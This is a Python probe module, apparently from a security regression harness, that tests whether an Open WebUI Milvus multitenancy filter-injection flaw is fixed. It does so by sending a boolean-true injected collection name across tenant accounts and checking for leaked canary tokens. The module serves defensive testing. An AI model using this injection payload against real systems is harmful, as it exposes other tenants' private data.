"""
Behavioral Regression Probe for CVE-2026-54019.
Target: Open WebUI < 0.9.6 (Milvus Multitenancy)
Bug Class: Vector Store Filter Injection
Channel: vector_payload

Mechanism:
In Milvus multitenancy mode, unvalidated collection names passed through to Milvus
were concatenated into unsafe filter expressions, allowing attackers to inject boolean-true
clauses (e.g. ' or 1==1 or ') and read across tenant vector partitions.
"""

from typing import List, Optional
from adapters.base import TargetAdapter, UserSession
from core.engine import CanaryToken, ProbingEngine, ProbeResult, LeakSeverity

CVE_ID = "CVE-2026-54019"
CHANNEL = "vector_payload"
BUG_CLASS = "vector_store_filter_injection"
PRECONDITION = "milvus_multitenancy"


def run(
    adapter: TargetAdapter,
    base_url: str,
    alice: UserSession,
    bob: UserSession,
    planted_canaries: List[CanaryToken],
    engine: ProbingEngine,
    dry_run: bool = False,
) -> ProbeResult:
    """Execute behavioral regression probe for CVE-2026-54019."""
    alice_kb_ids = alice.metadata.get("knowledge_ids", [])
    target_kb = alice_kb_ids[0] if alice_kb_ids else "default-collection"

    # Injected boolean-true filter string
    injected_collection = f"{target_kb}' or 1==1 or collection_name == 'x"
    prompt_label = f"Milvus boolean filter injection in collection parameter (CVE-2026-54019)"

    if dry_run:
        return engine.evaluate_response(
            prompt=prompt_label,
            response_text="Vector query syntax rejected by vector backend.",
            retrieved_contexts=[],
            planted_canaries=planted_canaries,
            probe_category=f"cve_regression:{CVE_ID}",
            channel=CHANNEL,
        )

    resp_text, retrieved_ctx, raw_resp = adapter.query_resource_direct(
        base_url,
        bob,
        resource_ref=injected_collection,
        k=50,
    )

    return engine.evaluate_response(
        prompt=prompt_label,
        response_text=resp_text,
        retrieved_contexts=retrieved_ctx,
        planted_canaries=planted_canaries,
        raw_response=raw_resp,
        probe_category=f"cve_regression:{CVE_ID}",
        channel=CHANNEL,
    )

